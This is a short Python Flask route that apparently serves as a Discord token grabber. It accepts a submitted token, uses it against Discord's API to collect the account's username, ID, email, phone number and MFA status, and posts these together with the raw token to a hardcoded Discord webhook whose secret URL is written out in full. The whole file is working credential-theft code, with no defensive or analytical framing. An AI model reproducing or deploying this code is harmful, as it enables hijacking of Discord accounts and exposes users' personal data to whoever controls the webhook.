import requests

@app.route('/submit', methods=['POST'])
def submit():
    token = request.form['token']
    webhook_url = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"

    # Validate the token (optional)
    try:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']
        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"

        # Example image URL
        image_url = "https://m.media-amazon.com/images/I/61dx3faBVrL._SL1500_.jpg"

        embed = {
            "title": f"{username} ({user_id})",
            "color": 0x000000,
            "thumbnail": {"url": avatar},
            "image": {"url": image_url},  # Include the image URL here
            "fields": [
                {"name": "Token", "value": f"```{token}```", "inline": False},
                {"name": "Email", "value": email if email else "None", "inline": True},
                {"name": "Phone", "value": phone if phone else "None", "inline": True},
                {"name": "MFA", "value": mfa, "inline": True}
            ]
        }

        requests.post(webhook_url, json={"embeds": [embed]})
    except Exception as e:
        print(f"Error processing token: {e}")

    return f"Token received: {token}"
